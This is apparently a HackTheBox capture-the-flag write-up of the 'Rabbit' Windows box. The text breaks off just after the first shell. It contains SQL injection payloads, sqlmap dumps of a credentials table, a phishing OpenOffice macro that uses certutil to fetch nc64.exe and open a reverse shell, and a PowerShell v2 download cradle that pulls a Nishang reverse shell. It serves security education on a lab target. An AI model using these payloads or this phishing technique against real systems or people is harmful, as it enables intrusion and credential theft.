---
title: HTB: Rabbit
url: https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html
date: 2022-04-28T09:00:00+00:00
difficulty: Insane [50]
os: Windows
tags: ctf, htb-rabbit, hackthebox, nmap, iis, apache, wamp, feroxbuster, owa, exchange, joomla, complain-management-system, searchsploit, sqli, burp, burp-repeater, sqlmap, crackstation, phishing, openoffice, macro, certutil, powershellv2, webshell, schtasks, attrib, htb-sizzle, htb-fighter
---

![Rabbit](https://0xdfimages.gitlab.io/img/rabbit-cover.png)

Rabbit was all about enumeration and rabbit holes. I’ll work to quickly eliminate vectors and try to focus in on ones that seem promising. I’ll find an instance of Complain Management System, and exploit multiple SQL injections to get a dump of hashes and usernames. I’ll use them to log into an Outlook Web Access portal, and use that access to send phishing documents with macros to get a shell. From there, I’ll find one of the webservers running as SYSTEM and write a webshell to get a shell. In Beyond Root, a look at a comically silly bug in the Complain Management System’s forgot password feature, as well as at the scheduled tasks on the box handling the automation.

## Box Info

| Name | [Rabbit](https://hackthebox.com/machines/rabbit)  [Rabbit](https://hackthebox.com/machines/rabbit) [Play on HackTheBox](https://hackthebox.com/machines/rabbit) |
| --- | --- |
| Release Date | [31 Mar 2018](https://twitter.com/hackthebox_eu/status/978915968641576961) |
| Retire Date | 18 Aug 2018 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Rabbit |
| Radar Graph | Radar chart for Rabbit |
| First Blood User | 11:34:47[Micah Micah](https://app.hackthebox.com/users/22435) |
| First Blood Root | 16:06:36[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| Creator | [lkys37en lkys37en](https://app.hackthebox.com/users/709) |

## Recon

### nmap

`nmap` finds a *ton* of open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 5000 -oA scans/nmap-alltcp 10.10.10.71
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-25 15:36 UTC
Nmap scan report for 10.10.10.71
Host is up (0.092s latency).
Not shown: 65484 closed ports
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
587/tcp   open  submission
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
808/tcp   open  ccproxy-http
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3306/tcp  open  mysql
5722/tcp  open  msdfsr
5985/tcp  open  wsman
6001/tcp  open  X11:1
6002/tcp  open  X11:2
6003/tcp  open  X11:3
6004/tcp  open  X11:4
6005/tcp  open  X11:5
6006/tcp  open  X11:6
6007/tcp  open  X11:7
6008/tcp  open  X11:8
6010/tcp  open  x11
6011/tcp  open  x11
6019/tcp  open  x11
6143/tcp  open  watershed-lm
8080/tcp  open  http-proxy
9389/tcp  open  adws
46672/tcp open  unknown
46678/tcp open  unknown
46682/tcp open  unknown
46702/tcp open  unknown
46704/tcp open  unknown
46735/tcp open  unknown
46758/tcp open  unknown
46764/tcp open  unknown
46769/tcp open  unknown
46772/tcp open  unknown
46777/tcp open  unknown
46795/tcp open  unknown
46808/tcp open  unknown
46821/tcp open  unknown
46831/tcp open  unknown
46861/tcp open  unknown
47001/tcp open  winrm
64327/tcp open  unknown
64337/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds

```

I usually just type in the ports to the next `nmap` scan to run scripts and version check, but given the number here, I’ll capture them with some Bash foo and pass that in:

```

oxdf@hacky$ ports=$(nmap -p- --min-rate 10000 10.10.10.71 | grep tcp  | cut -d '/' -f1 | tr '\n' ',')  
oxdf@hacky$ nmap -p ${ports} -sC -sV -oA scans/nmap-tcpscripts 10.10.10.71
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-25 15:58 UTC
Nmap scan report for 10.10.10.71
Host is up (0.097s latency).

PORT      STATE SERVICE              VERSION
25/tcp    open  smtp                 Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.14.6], SIZE, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XEXCH50, XRDST, XSHADOW, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
|_ssl-date: 2022-04-25T21:01:36+00:00; +5h00m00s from scanner time.
53/tcp    open  domain               Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
80/tcp    open  http                 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 403 - Forbidden: Access is denied.
88/tcp    open  kerberos-sec         Microsoft Windows Kerberos (server time: 2022-04-25 20:58:22Z)
135/tcp   open  msrpc                Microsoft Windows RPC
389/tcp   open  ldap                 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
|_ssl-date: 2022-04-25T21:01:35+00:00; +5h00m00s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
587/tcp   open  smtp                 Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.14.6], SIZE 10485760, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, AUTH GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
|_ssl-date: 2022-04-25T21:01:36+00:00; +5h00m00s from scanner time.
593/tcp   open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
808/tcp   open  ccproxy-http?
3268/tcp  open  ldap                 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3306/tcp  open  mysql                MySQL 5.7.19
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.19
|   Thread ID: 4
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, SupportsLoadDataLocal, IgnoreSigpipes, InteractiveClient, LongPassword, SupportsTransactions, Support41Auth, ODBCClient, SupportsCompression, Speaks41ProtocolOld, ConnectWithDatabase, LongColumnFlag, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x149\x12,=\x04<l7C=+:3\x1A'\x12m0_
|_  Auth Plugin Name: mysql_native_password
5722/tcp  open  msrpc                Microsoft Windows RPC
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6001/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6002/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6003/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6004/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6005/tcp  open  msrpc                Microsoft Windows RPC
6006/tcp  open  msrpc                Microsoft Windows RPC
6007/tcp  open  msrpc                Microsoft Windows RPC
6008/tcp  open  msrpc                Microsoft Windows RPC
6010/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
6011/tcp  open  msrpc                Microsoft Windows RPC
6019/tcp  open  msrpc                Microsoft Windows RPC
6143/tcp  open  msrpc                Microsoft Windows RPC
8080/tcp  open  http                 Apache httpd 2.4.27 ((Win64) PHP/5.6.31)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.27 (Win64) PHP/5.6.31
|_http-title: Example
9389/tcp  open  mc-nmf               .NET Message Framing
46672/tcp open  msrpc                Microsoft Windows RPC
46678/tcp open  msrpc                Microsoft Windows RPC
46682/tcp open  msrpc                Microsoft Windows RPC
46702/tcp open  msrpc                Microsoft Windows RPC
46704/tcp open  msrpc                Microsoft Windows RPC
46735/tcp open  msrpc                Microsoft Windows RPC
46758/tcp open  msrpc                Microsoft Windows RPC
46764/tcp open  msrpc                Microsoft Windows RPC
46769/tcp open  msrpc                Microsoft Windows RPC
46772/tcp open  msrpc                Microsoft Windows RPC
46777/tcp open  msrpc                Microsoft Windows RPC
46795/tcp open  msrpc                Microsoft Windows RPC
46808/tcp open  msrpc                Microsoft Windows RPC
46821/tcp open  msrpc                Microsoft Windows RPC
46831/tcp open  msrpc                Microsoft Windows RPC
46861/tcp open  msrpc                Microsoft Windows RPC
47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
64327/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
64337/tcp open  mc-nmf               .NET Message Framing
Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 393.35 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the box is likely running Windows 7 or Server 2008 R2.

I’ll group the various ports here:
- SMTP / Exchange - 25, 587, 64327, 64337
- DNS - 53
- HTTP(S) - 80, 443, 8080
- Active Directory related - 88 (Kerberos), 389 (LDAP), 464 (Kerberos password change), 636 (LDAP SSL), 3268 (LDAP), 3269 (LDAP SSL), 9389 (AD Web Services)
- RPC - 135, 593, 5722, 4xxxx
- SMB - 445
- MySQL - 3306
- WinRM - 5985
- Potential x11 or RPC - 6001-6143
- Unknown - 808

`nmap` scan of SMTP also shows the domain, `Rabbit.htb.local`.

There’s a ton of stuff to potentially look at, and a lot of rabbit holes. I’ll take a quick look at most these ports, but I’m not going to just show that something is closed here, or this enumeration section will run on forever. Some quick summaries:
- SMB null auth failed.
- Zone transfers over DNS for rabbit.htb and rabbit.htb.local both failed.
- I am not able to connect to `mysql` without creds.
- Port 80 webserver returns 403 Forbidden, and no paths were easily brute forced on it with `feroxbuster`.

### Website - TCP 443

#### Site

The site is just the default IIS page:

![image-20220425123054776](https://0xdfimages.gitlab.io/img/image-20220425123054776.png)

#### Tech Stack

The response headers show the IIS version, as well as the `X-Powered-By` header with `ASP.NET`:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 24 Oct 2017 17:37:39 GMT
Accept-Ranges: bytes
ETag: "283fa3c9ee4cd31:0"
Vary: Accept-Encoding
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 25 Apr 2022 21:29:49 GMT
Connection: close
Content-Length: 689

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site. Given the number of rabbit holes, I’ll just show with a `--depth` of 1, and not go recursive. I’ll also include `-x asp,aspx` based on the response headers:

```

oxdf@hacky$ feroxbuster -u https://10.10.10.71 -x asp,aspx -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --depth 1

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.10.10.71
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [asp, aspx]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      157c https://10.10.10.71/aspnet_client => https://10.10.10.71/aspnet_client/
302      GET        2l       10w      146c https://10.10.10.71/public => https://10.10.10.71/owa
302      GET        2l       10w      146c https://10.10.10.71/exchange => https://10.10.10.71/owa
401      GET        1l       11w       58c https://10.10.10.71/rpc
301      GET        0l        0w        0c https://10.10.10.71/owa => /owa/
302      GET        2l       10w      146c https://10.10.10.71/exchweb => https://10.10.10.71/owa
[####################] - 2m     79749/79749   0s      found:6       errors:3      
[####################] - 2m     79749/79749   511/s   https://10.10.10.71 

```

There’s a handful of paths that redirect to `/owa`. There’s also `aspnet_client`, which just returns 403 on visiting it. `/rpc` pops an auth dialog.

#### owa

`/owa` redirects to `/owa/auth/logon.aspx`, an Outlook web access login page:

![image-20220425125133977](https://0xdfimages.gitlab.io/img/image-20220425125133977.png)

The copyright is from 2010, giving some indication of the version.

This will be worth keeping in mind when I find creds.

### Website - TCP 8080

#### Site

The site returns some ASCII art of a Rabbit:

![image-20220425125239724](https://0xdfimages.gitlab.io/img/image-20220425125239724.png)

#### Tech Stack

Interesting, the HTTP headers show a completely different webserver. It’s Apache with PHP:

```

HTTP/1.1 200 OK
Date: Mon, 25 Apr 2022 21:51:50 GMT
Server: Apache/2.4.27 (Win64) PHP/5.6.31
Last-Modified: Thu, 16 Nov 2017 03:54:55 GMT
ETag: "2751-55e119546d494"
Accept-Ranges: bytes
Content-Length: 10065
Connection: close
Content-Type: text/html

```

#### Directory Brute force

Just like on 443, there’s a bunch of stuff here, so I’ll just show with `--depth 1`. I’ll use `-x php` this time based on that HTTP response headers:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.71:8080 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --depth 1

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.71:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      107l      178w    10065c http://10.10.10.71:8080/index
403      GET       11l       33w      308c http://10.10.10.71:8080/phpmyadmin
301      GET        9l       29w      328c http://10.10.10.71:8080/joomla => http://10.10.10.71:8080/joomla/
200      GET      345l     1784w   202575c http://10.10.10.71:8080/favicon
403      GET       11l       33w      308c http://10.10.10.71:8080/phpsysinfo
403      GET       11l       33w      301c http://10.10.10.71:8080/con
403      GET       11l       33w      305c http://10.10.10.71:8080/con.php
403      GET       11l       33w      301c http://10.10.10.71:8080/aux
403      GET       11l       33w      305c http://10.10.10.71:8080/aux.php
403      GET       11l       33w      305c http://10.10.10.71:8080/adminer
301      GET        9l       29w      330c http://10.10.10.71:8080/complain => http://10.10.10.71:8080/complain/
403      GET       11l       33w      308c http://10.10.10.71:8080/error%1F_log
403      GET       11l       33w      312c http://10.10.10.71:8080/error%1F_log.php
403      GET       11l       33w      301c http://10.10.10.71:8080/prn
403      GET       11l       33w      305c http://10.10.10.71:8080/prn.php

```

A bunch of these return 403, and don’t show any pages under them (additional `feroxbuster` runs not shown).

#### joomla

The `/joomla` path shows a login page:

![image-20220425132404995](https://0xdfimages.gitlab.io/img/image-20220425132404995.png)

`http://10.10.10.71:8080/joomla/administrator/manifests/files/joomla.xml` shows the version, 3.8.1:

![image-20220425132602756](https://0xdfimages.gitlab.io/img/image-20220425132602756.png)

This version was released not that long before Rabbit, so it’s unlikely that the intended path involves exploits in the core. I couldn’t find anything vulnerable on this site.

#### complain

The site presents a login to the Complain Management System:

![image-20220425133148967](https://0xdfimages.gitlab.io/img/image-20220425133148967.png)

Some basic password guessing doesn’t work, so I’ll click on the “Register Here” link. After a few attempts with errors messages, I finally get this to register:

![image-20220425154955083](https://0xdfimages.gitlab.io/img/image-20220425154955083.png)

The drop down only offered “Customer”, and I tried changing it in Burp to “Administrator” and “Employee” (which are the other options available at login), and it didn’t work.

![image-20220425155212511](https://0xdfimages.gitlab.io/img/image-20220425155212511.png)

When logged in as a customer, there’s a main landing page:

[![image-20220425155402540](https://0xdfimages.gitlab.io/img/image-20220425155402540.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220425155402540.png)

“Select Plans” has a list of options to choose from and submit.

“Make Complains” presents a form to make a complaint, but submitting it returns an error “Incorrect datetime value: ‘’ for column ‘close\_date’ at row 1”. This seems to be broken.

“View Complain Details” looks like it’s meant to display back a table of complaints, but the table is empty.

There’s a really silly vulnerability in the forgot password functionality of the site that doesn’t end up being useful to the box, but I’ll show it in [Beyond Root](#complain-user-password-reset).

## Shell as raziel

### Dump secrets Table

#### Identify SQL Injection

Throwing “complain” into `searchsploit` returns hits that seem interesting:

```

oxdf@hacky$ searchsploit complain
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Complain Management System - Hard-Coded Credentials / Blind SQL inj | php/webapps/42968.txt
Complain Management System - SQL injection                          | php/webapps/41131.txt
Complaint Management System 1.0 - 'cid' SQL Injection               | php/webapps/48758.txt
Complaint Management System 1.0 - 'username' SQL Injection          | php/webapps/48468.py
Complaint Management System 1.0 - Authentication Bypass             | php/webapps/48452.txt
Complaint Management System 4.0 - 'cid' SQL injection               | php/webapps/47847.txt
Complaint Management System 4.0 - Remote Code Execution             | php/webapps/47884.py
Complaint Management System 4.2 - Authentication Bypass             | php/webapps/48371.txt
Complaint Management System 4.2 - Cross-Site Request Forgery (Delet | php/webapps/48372.txt
Complaint Management System 4.2 - Persistent Cross-Site Scripting   | php/webapps/48370.txt
Complaints Report Management System 1.0 - 'username' SQL Injection  | php/webapps/48985.txt
Consumer Complaints Clone Script 1.0 - 'id' SQL Injection           | php/webapps/43274.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The top two are clear matches for this. The rest are “complaint” not “complain”, so I’m less confident there. When I ran this originally on solving in 2018, only the top two returned.

Both of these mention default credentials of “admin” / “admin123”, but it doesn’t work here. Then each has a different SQL injection.

#### SQLI #1

`41131.txt` gives a POC with the following URL, and notes it requires passing a cookie:

```

http://192.168.19.135/cms/process.php?action=deleteCust&cId=123

```

It shows using `sqlmap`, but I’ll take a quick look manually. It’s a boolean-based blind (or time-based blind, but boolean is faster) injection.

Using the example from the POC, when `8336=8336`, it returns 302:

![image-20220425160236378](https://0xdfimages.gitlab.io/img/image-20220425160236378.png)

When I change it to `8335=8336`, it returns a 200, but with an error:

![image-20220425160329144](https://0xdfimages.gitlab.io/img/image-20220425160329144.png)

So any boolean question that an attacker wants to ask can be asked inside the `()`.

#### SQLI #2

`42968.txt` shows a similar issue, this time in

```

http://192.168.1.104/view.php?mod=admin&view=repod&id=plans

```

It also shows using `sqlmap` to exploit. This exploit is claiming to also be blind injection. On visiting that URL, there’s a table of orders (it says “Admin View”, even though I’m still a customer role):

![image-20220425160653291](https://0xdfimages.gitlab.io/img/image-20220425160653291.png)

Putting a `'` at the end of the url after `plans` leads to an error:

![image-20220425160740620](https://0xdfimages.gitlab.io/img/image-20220425160740620.png)

It’s clearly trying to escape `'` with backslash. However, what if I try UNION without a `'`? Changing `id` to `id=plans UNION select 1` returns a different error:

![image-20220425160849674](https://0xdfimages.gitlab.io/img/image-20220425160849674.png)

That’s a good indication of UNION injection. I’ll try adding columns until I get to `id=plans UNION select 1,2,3,4,5`:

![image-20220425160948859](https://0xdfimages.gitlab.io/img/image-20220425160948859.png)

There’s a new row on the bottom. I can’t use quotes (single or double), so that makes this trickier, but still doable. I can get things like the current user, the MySQL DB version, and the current database with `id=plans union select 1,user(),version(),database(),5`:

![image-20220425165339436](https://0xdfimages.gitlab.io/img/image-20220425165339436.png)

#### sqlmap

Given that both seem like a pain to do, I’ll turn to `sqlmap`. With the hope of potentially finding the UNION injection, I’ll revisit the URL from #2 above, `http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans`, and then in Burp, find that request and right-click and “Copy to File”.

Then I’ll start `sqlmap`. Because I want it to focus on the UNION injection, I’ll give it `--technique U`:

```

oxdf@hacky$ sqlmap -r view.php-request -p id --batch --technique U
...[snip]...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 19 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: mod=admin&view=repod&id=plans UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b626b71,0x4d6e48486a5148534d617a767650764754777a476a4e45615761746245506c667571654a7a49446e,0x7170716271),NULL-- -
---
[20:22:01] [INFO] testing MySQL
[20:22:02] [INFO] confirming MySQL
[20:22:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[20:22:04] [INFO] fetched data logged to text files under '/home/oxdf/.sqlmap/output/10.10.10.71'

```

I’ll add `--dbs` to list the databases:

```

[20:36:27] [INFO] fetching database names
available databases [7]:
[*] complain
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] secret
[*] sys

```

`secret` is interesting. I’ll start there.

Replace `--dbs` with `-D secret --tables`:

```

[20:37:07] [INFO] fetching tables for database: 'secret'
Database: secret
[1 table]
+-------+
| users |
+-------+

```

Now I’ll dump that table with `-D secret -T users --dump`:

```

[20:37:30] [INFO] fetching columns for table 'users' in database 'secret'
[20:37:30] [INFO] fetching entries for table 'users' in database 'secret'
[20:37:31] [INFO] recognized possible password hashes in column '`Password`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[20:37:31] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[20:37:31] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[20:37:31] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[20:37:31] [INFO] starting 4 processes 
[20:37:32] [INFO] cracked password 'barcelona' for user 'Malek'
[20:37:34] [INFO] cracked password 'popcorn' for user 'Dumah'
[20:37:34] [INFO] cracked password 'pussycatdolls' for user 'Ariel'
[20:37:34] [INFO] cracked password 'santiago' for user 'Moebius'
Database: secret
Table: users
[10 entries]
+----------+--------------------------------------------------+
| Username | Password                                         |
+----------+--------------------------------------------------+
| Kain     | 33903fbcc0b1046a09edfaa0a65e8f8c                 |
| Raziel   | 719da165a626b4cf23b626896c213b84                 |
| Ariel    | b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls) |
| Dimitri  | d459f76a5eeeed0eca8ab4476c144ac4                 |
| Magnus   | 370fc3559c9f0bff80543f2e1151c537                 |
| Zephon   | 13fa8abd10eed98d89fd6fc678afaf94                 |
| Turel    | d322dc36451587ea2994c84c9d9717a1                 |
| Dumah    | 33da7a40473c1637f1a2e142f4925194 (popcorn)       |
| Malek    | dea56e47f1c62c30b83b70eb281a6c39 (barcelona)     |
| Moebius  | a6f30815a43f38ec6de95b9a9d74da37 (santiago)      |
+----------+--------------------------------------------------+

```

Because I’m using `--batch`, it selects the default answer of “yes” for prompt of if I want to try and crack the hashes, and cracks four of them.

### Crack Passwords

I don’t actually need more than these four, but no reason not to throw them into [crackstation](https://crackstation.net/):

[![image-20220425165717839](https://0xdfimages.gitlab.io/img/image-20220425165717839.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220425165717839.png)

All but two break.

### Phishing

#### OWA Enumeration

The passwords for Kain, Ariel, and Magnus work to log into OWA, and each have the same three emails from Administrator:

[![image-20220425165900340](https://0xdfimages.gitlab.io/img/image-20220425165900340.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220425165900340.png)

“TPS Reports” says:

> Please send your weekly TPS reports to management ASAP!
>
> Administrator

“Security Updates” says:

> The security team has deployed windows defender and PowerShell constrain mode as the default organization security standard.
>
> Security

“Updated software list” says:

> There has been a change in the allowed software. Help Desk has moved forward with deploying Open Office to everyone.
>
> IT

These emails are a good hint as to where to go next. Someone is expecting a TPS report, likely in Open Office format, and Defender will likely eat known payloads (like anything from Metasploit or `msfvenom`). If I want to use PowerShell, I’ll be working with [constrained language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), which I last showed on [Sizzle](/2019/06/01/htb-sizzle.html#clm--applocker-break-out).

On logging in, there’s a checkbox to use the “light version” of OWA. Clicking that will provide a much smoother experience.

#### Create Doc

I’ll open up Libre Writer and put some dummy text into the page:

![image-20220425172125054](https://0xdfimages.gitlab.io/img/image-20220425172125054.png)

I’ll save the document.

Clicking “Tools” > “Macros” > “Edit Macros…” open the macro editor.

At first, there’s no module in the “Standard” folder in the document. “Tools” > “Organize Macros” > “Basic…” will open another dialog, and the “New” button will let me create one:

![image-20220425173353785](https://0xdfimages.gitlab.io/img/image-20220425173353785.png)

Back in the editor, I’ll go to that new Module 1 and find it comes with a `main` function. I’ll change that to `OnLoad` just for my own reminder of what it’s doing. I can call shell commands using `shell()`.

I’ll also need to go to “Tools” > “Customize…” to get to the document customize dialoag. In there, I’ll go to the “Events” tab, and click the “Open Document” event, then the “Assign Macro…” button. I’ll associate the `OnLoad` macro with this even so it will run on open:

![image-20220428085349342](https://0xdfimages.gitlab.io/img/image-20220428085349342.png)

#### Payload #1 - certutil and nc.exe

I’ll set my macro to:

```

Sub OnLoad

	shell("cmd /c certutil -urlcache -split -f http://10.10.14.6/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd 10.10.14.6 443")

End Sub

```

I’ll reply all to the TPS email, and include another user, Raziel who shows up in the list on the left:

![image-20220425174332299](https://0xdfimages.gitlab.io/img/image-20220425174332299.png)

After a few minutes (many minutes, I’ll look at the automation in [Beyond Root](#automation-analysis)), there’s a hit at my webserver for `nc64.exe`, and then a shell:

```

oxdf@hacky$ rlwrap -cAr ncat -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.71.
Ncat: Connection from 10.10.10.71:37178.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\OpenOffice 4\program>whoami
htb\raziel

```

And I can read `user.txt`:

```

C:\Users\Raziel\Desktop>type user.txt
c6f45142************************

```

#### Payload #2 - PowerShell -version 2

Another old workaround for constrained language mode was just to tell PowerShell at startup to use an older version, version 2, that doesn’t support it. PowerShell v2 is not likely to be present on any modern systems today, but this definitely was common in 2018.

I’ll give the macro a simple download cradle:

```

Sub OnLoad
    Shell("cmd.exe /C ""powershell.exe -version 2 IEX ((new-object Net.WebClient).DownloadString('http://10.10.14.6/rev.ps1'));""")
End Sub

```

In this case, I’ll grab a [Nishang reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), add a line to the end to call invoke the function back to my host, and save it as `rev.ps1` in the directory my webserver is serving. I’ll send the email just like above, and after many minutes, it connects and returns a shell:

```

oxdf@hacky$ rlwrap -cAr ncat -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.71.
Ncat: Connection from 10.10.10.71:22338.
Windows PowerShell running as user Raziel on RABBIT
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\OpenOffice 4\program>

```

## Shell as SYSTEM

### Enumeration

#### Homedirs

There’s nothing else in raziel’s home directory, and there’s no other interesting users on the box:

```

PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       11/13/2017   8:22 PM                Administrator                 
d-----       10/24/2017   1:38 PM                Classic .NET AppPool          
d-r---        7/14/2009  12:57 AM                Public                        
d-----       10/29/2017  11:12 PM                Raziel  

```

#### Processes

